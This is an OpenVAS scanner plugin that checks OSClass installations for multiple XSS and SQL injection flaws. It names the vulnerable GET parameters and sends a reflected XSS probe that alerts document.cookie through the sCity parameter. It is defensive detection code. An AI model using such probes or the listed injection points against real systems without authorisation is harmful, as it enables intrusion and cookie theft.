###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_osclass_mult_xss_n_sql_inj_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# OSClass Multiple XSS and SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to execute arbitrary web
  script or HTML in a user's browser session in the context of an affected
  site and manipulate SQL queries by injecting arbitrary SQL code.
  Impact Level: Application";
tag_affected = "OSClass version prior to 2.3.5";
tag_insight = "- Input passed via the 'sCategory' GET parameter to /index.php is not
    properly sanitised before being used in SQL query.
  - Input passed via the 'sCity', 'sPattern', 'sPriceMax', 'sPriceMin' GET
    parameters to /index.php is not properly sanitised before being returned
    to the user.
  - Input passed via the 'id' GET parameter in edit_category_post and
    enable_category action is not properly sanitised before being used in
    SQL query.
  - Input passed via the 'id' GET parameter in enable_category action to
    index.php is not properly sanitised before being returned to the user.";
tag_solution = "Upgrade to OSClass version 2.3.5 or later
  For updates refer to http://sourceforge.net/projects/osclass/files/";
tag_summary = "This host is running OSClass and is prone to multiple cross site scripting
  and SQL injection vulnerabilities.";

if (description)
{
  script_id(802970);
  script_version("$Revision: 12 $");
  script_bugtraq_id(51662);
  script_cve_id("CVE-2012-0973", "CVE-2012-0974", "CVE-2012-5162", "CVE-2012-5163");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-09-27 10:53:49 +0530 (Thu, 27 Sep 2012)");
  script_name("OSClass Multiple XSS and SQL Injection Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47697");
  script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23068");
  script_xref(name : "URL" , value : "http://osclass.org/blog/2012/01/16/osclass-2-3-5/");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2012-01/0157.html");
  script_xref(name : "URL" , value : "http://www.codseq.it/advisories/multiple_vulnerabilities_in_osclass");

  script_description(desc);
  script_summary("Determine if OSClass is prone to XSS vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
dir = "";
url = "";

## Get HTTP Host
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over possible dirs
foreach dir (make_list("", "/osclass", cgi_dirs()))
{
  url = string(dir, "/oc-admin/index.php");

  ## Confirm the application
  if(http_vuln_check(port:port, url:url, check_header:TRUE,
     pattern:'>OSClass admin panel login<', extra_check:'"OSClass">'))
  {
    ## Constuct an attck
    url = string(dir, '/index.php?page=search&sCity="' +
                      '><script>alert(document.cookie);</script>');

    ## Check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
                       pattern:"><script>alert\(document.cookie\);</script>",
                       extra_check:'>OSClass<'))
    {
      security_hole(port:port);
      exit(0);
    }
  }
}
